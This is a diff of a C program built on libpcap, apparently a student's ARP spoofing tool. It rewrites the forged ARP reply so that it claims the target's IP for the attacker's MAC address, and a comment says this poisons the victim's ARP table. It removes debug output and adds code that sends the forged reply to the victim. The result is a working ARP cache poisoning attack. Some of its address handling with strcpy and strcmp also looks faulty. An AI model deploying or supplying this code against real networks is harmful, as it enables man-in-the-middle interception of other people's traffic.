@@ -150,14 +150,13 @@ int main(int argc, char* argv[]) {
   arp_reply->plen = ARP_PLEN;
   arp_reply->oper = swap_word_endian(ARP_OPER_REP);
   memcpy(arp_reply->sha , mac_attacker ,6);                      // strcpy doesn't work so i use memcpy
-  strcpy(arp_reply->spa , ip_attacker);
+  strcpy(arp_reply->spa , ip_target);                             // Poisoning victim's arp table (in victim arp table , target's mac address is changed to attacer's mac address) 
   strcpy(arp_reply->tha , mac_sender);                            // We have to get sender(victim) mac address by arp request
-  strcpy(arp_reply->tpa , ip_target);
+  strcpy(arp_reply->tpa , ip_sender);                             // Sender ip (Victim)
 /*************************************************************************************************/
 
   printf("send arp request\n");
   pcap_sendpacket(handle ,(unsigned char*)arp_request_packet , 42);
-  //printarr((unsigned char*)arp_request_packet , 42);
 
   while (true) {
     res = pcap_next_ex(handle, &header, &packet);
@@ -171,14 +170,12 @@ int main(int argc, char* argv[]) {
       && swap_word_endian(arp->oper) == ARP_OPER_REP	         // Is it arp reply ?
       &&!strcmp(arp->spa , ip_sender)	 )                        // Is it sender ip (victim)?
     {
-      printf("operation is %x\n",swap_word_endian(arp->oper));
-      printarr((unsigned char*)packet,42);
-      memcpy(mac_sender , arp->sha , 6);		                  // Get sender(victim) mac address
-      printarr((unsigned char*)arp->sha , 6);
-      printarr((unsigned char*)mac_sender , 6);
+      memcpy(mac_sender , arp->sha , 6);		                              // Get sender(victim) mac address
       memcpy((char*)(ethernet_reply->ether_dhost) , mac_sender , 6);  // Set sender(victim) mac address in arp reply
       memcpy(arp_reply->tha , mac_sender , 6);                            // Set sender(victim) mac address in arp reply
-      printarr((unsigned char*)arp_reply_packet,42);
+
+      printf("send arp reply packet\n");
+      pcap_sendpacket(handle ,(unsigned char*)arp_reply_packet , 42);
     }
 
 
